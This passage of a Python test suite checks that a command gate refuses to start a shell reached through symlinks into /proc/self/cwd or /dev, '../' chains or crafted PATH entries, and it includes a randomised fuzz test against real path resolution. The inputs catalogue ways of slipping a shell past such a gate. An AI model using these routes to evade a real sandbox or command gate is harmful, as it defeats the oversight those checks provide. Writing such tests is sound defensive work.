    (sub / "m3").symlink_to("../" * 30 + "proc/self/cwd/mysh")
    (sub / "up").symlink_to("../" * 30)
    monkeypatch.chdir(run_dir)
    for word in ["./m2", "./m3", "up/proc/self/cwd/mysh", "up/dev/null"]:
        got = plan_gate(G(argv=(word, "-c", "x"), cwd="sub"), Workspace(tmp_path), False)
        assert isinstance(got, str) and "/proc or /dev" in got, word


def test_a_harmless_dotdot_inside_a_link_target_is_followed_not_refused(tmp_path: Path) -> None:
    """The `..` rule is for the executable WORD; a link's own target may use `..` and is resolved."""
    (tmp_path / "x").mkdir()
    (tmp_path / "y").mkdir()
    tool = tmp_path / "y" / "tool"
    tool.write_text("#!/bin/sh\nexit 0\n")
    tool.chmod(0o755)
    (tmp_path / "l").symlink_to("../" + tmp_path.name + "/x/../y/tool")
    assert isinstance(plan(tmp_path, argv=("./l",)), Plan)
    assert gm._walk(str(tmp_path / "l")) == str(tool)
    assert gm._walk("/") == "/" and gm._walk("/a/b/c") == "/a/b/c"


def test_a_path_hit_that_is_a_link_into_proc_is_refused_when_the_runner_lacks_the_target(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The runner's /proc/self/cwd has no `mysh`, so `isfile` there says no and the search would go on,
    while the child opens ITS cwd and finds the shell: the hit is walked before it is tested."""
    run_dir, sub = tmp_path / "run", tmp_path / "sub"
    run_dir.mkdir()
    sub.mkdir()
    (sub / "mytool").symlink_to("/proc/self/cwd/mysh")
    monkeypatch.chdir(run_dir)
    monkeypatch.setenv("PATH", str(sub))
    got = plan_gate(G(argv=("mytool", "-c", "a"), cwd="sub"), Workspace(tmp_path), False)
    assert isinstance(got, str) and "/proc or /dev" in got


_FUZZ_NAMES = ["l1", "l2", "l3", "mysh", "d", "e"]
_FUZZ_TOK = _FUZZ_NAMES + ["lnk", "up", "mysh2", "z", "m3", "q", "..", "..", ".", "sub", "bin"]
_FUZZ_TOK += ["bash", "x", "y", "", "proc", "self", "cwd", "root", "dev", "fd"]


def _fuzz_layout(rnd: random.Random, base: Path) -> None:
    def toks(k: int) -> str:
        return "/".join(rnd.choice(_FUZZ_TOK) for _ in range(k))

    links = [
        ("sub/lnk", rnd.choice(["/proc/self/cwd", "/proc/thread-self/cwd", f"/proc/self/root{base}/sub",
                                "../" * 12 + "proc/self/cwd", ".", "/proc/self/cwd/.", "/proc/self/cwd/../sub"])),
        ("sub/up", rnd.choice(["..", "../", "../.", "../sub/..", "../x/.."])),
        ("sub/d", rnd.choice(["../bin", f"{base}/bin", "../x/../bin", "up/bin"])),
        ("mysh", rnd.choice(["bin/bash", "./bin/bash", f"{base}/bin/bash"])),
        ("sub/mysh2", rnd.choice(["../bin/bash", "d/bash", "../mysh", "lnk/../mysh"])),
        ("x/y/z", rnd.choice(["../../bin", "../../mysh", "../../sub/lnk", "../../sub/up"])),
        ("bin/m3", rnd.choice(["bash", "./bash", "../mysh", "../sub/mysh2"])),
        ("x/q", rnd.choice(["y/z", "y/z/bash", "../mysh"])),
    ]  # fmt: skip
    for rel, target in links:
        if rnd.random() < 0.8:
            (base / rel).symlink_to(target)
    for _ in range(rnd.randint(0, 2)):  # random extra links, some into /proc and /dev
        where = base / rnd.choice(["", "sub", "bin", "x", "x/y"]) / rnd.choice(_FUZZ_NAMES)
        if not where.is_symlink() and not where.exists():
            kind = rnd.random()
            if kind < 0.3:
                target = rnd.choice(
                    ["/proc/self/cwd", "/proc/self/root", "/dev", "/dev/fd", "/proc"]
                )
                target += "/" + toks(rnd.randint(0, 3))
            elif kind < 0.6:
                target = "../" * rnd.randint(1, 14) + toks(rnd.randint(0, 3))
            else:
                target = toks(rnd.randint(1, 4))
            where.symlink_to(target or "bin/bash")


@pytest.mark.parametrize("seed", [1, 2, 3])
def test_differential_fuzz_the_kernel_resolution_versus_the_plan(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, seed: int
) -> None:
    """Truth: this process with its cwd set to the gate's cwd stats the word (what the child's exec
    resolves; /proc/self/cwd is then the gate's folder). Plan: `_shell_refusal` with the process cwd in
    another folder (the runner). If the kernel reaches the test-made `bash`, the plan must refuse.
    Random links (to /proc, /dev, `..` chains, absolute and relative) and random words."""
    rnd = random.Random(seed)
    reached = 0
    wrong: list[Any] = []
    for n in range(150):
        base = (tmp_path / f"L{n}").resolve()
        for d in ["bin", "sub", "a/b", "x/y"]:
            (base / d).mkdir(parents=True)
        bash = base / "bin" / "bash"
        bash.write_text(gate_matrix.FAKE)
        bash.chmod(0o755)
        want = (bash.stat().st_dev, bash.stat().st_ino)
        _fuzz_layout(rnd, base)
        for _ in range(40):
            if rnd.random() < 0.25:
                word = rnd.choice([*_FUZZ_NAMES, "bash", "mysh2", "m3", "lnk"])
                entries = ["", ".", "sub", "bin", "x", f"{base}/sub", f"{base}/x/y", f"{base}/bin"]
                entries += ["/proc/self/cwd", "d", "e", "l1", "l2"]
                path: str | None = ":".join(rnd.choice(entries) for _ in range(rnd.randint(1, 3)))
            else:
                pre = rnd.choice(
                    ["", "./", f"{base}/", "/proc/self/cwd/", "sub/", "../", "/", "//", "bin/"]
                )
                tail = [rnd.choice([*_FUZZ_NAMES, "bash", "mysh", "mysh2", "m3", "z", "q"])]
                word = pre + "/".join(
                    [rnd.choice(_FUZZ_TOK) for _ in range(rnd.randint(0, 4))] + tail
                )
                path = None
            if not word or word.startswith("-") or "=" in word or word.endswith("/"):
                continue
            if "/" not in word and path is None:
                path = os.environ["PATH"]
            monkeypatch.chdir(base / "sub")
            hit = None
            if path is None:
                hit = word
            else:
                for entry in path.split(":"):
                    cand = os.path.join(entry, word)
                    if os.path.isfile(cand) and os.access(cand, os.X_OK):
                        hit = cand
                        break
            try:
                st = os.stat(hit) if hit is not None else None
            except OSError:
                st = None
            monkeypatch.chdir(base / "a" / "b")
            if path is not None:
                monkeypatch.setenv("PATH", path)
            got = gm._shell_refusal((word,), base / "sub")
            monkeypatch.undo()
            if st is not None and (st.st_dev, st.st_ino) == want:
                reached += 1
                if got is None:
                    wrong.append((word, path))
        shutil.rmtree(base)
    assert reached >= 40, reached  # the generator really builds routes to the shell
    assert not wrong, wrong[:3]
